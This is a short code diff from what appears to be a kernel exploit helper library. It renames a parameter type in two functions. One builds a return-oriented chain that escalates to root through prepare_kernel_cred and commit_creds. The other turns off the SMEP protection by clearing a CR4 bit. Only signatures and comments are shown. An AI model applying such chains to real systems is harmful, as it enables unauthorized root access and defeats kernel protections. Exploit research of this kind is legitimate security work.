@@ -6,10 +6,10 @@
 /* ============= Kcreds Commit ============= */
 
 /* ROP: prepare_kernel_cred -> commit_creds -> swapgs -> iretq */
-size_t chain_kcred_iretq(rop_chain_t rop,
+size_t chain_kcred_iretq(rop_buffer_t rop,
                         uintptr_t pop_rdi_ret,
                         uintptr_t prepare_kernel_cred,
-                        rop_chain_t mov_rdi_rax_rop,
+                        rop_buffer_t mov_rdi_rax_rop,
                         uintptr_t commit_creds,
                         uintptr_t swapgs_pop_rbp_ret,
                         uintptr_t iretq,
@@ -51,7 +51,7 @@ size_t chain_kcred_iretq(rop_chain_t rop,
  * */
 
 /* CR4 SMEP off: zero 20th bit */
-size_t chain_cr4_smep(rop_chain_t rop,
+size_t chain_cr4_smep(rop_buffer_t rop,
                       uintptr_t pop_rdi_ret,
                       uintptr_t cr4_val,
                       uintptr_t mov_cr4_rdi_ret,
